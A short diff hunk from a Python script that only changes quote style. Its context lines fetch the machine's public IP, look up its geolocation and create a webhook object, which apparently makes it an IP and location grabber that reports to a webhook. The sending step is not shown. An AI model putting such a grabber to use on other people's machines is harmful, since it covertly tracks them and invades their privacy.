@@ -10,7 +10,7 @@ from datetime import datetime
 hook = Webhook("webhook here")
 
 time = datetime.now().strftime("%H:%M %p")  
-ip = requests.get('https://api.ipify.org/').text
+ip = requests.get("https://api.ipify.org/").text
 
 r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
 geo = r.json()
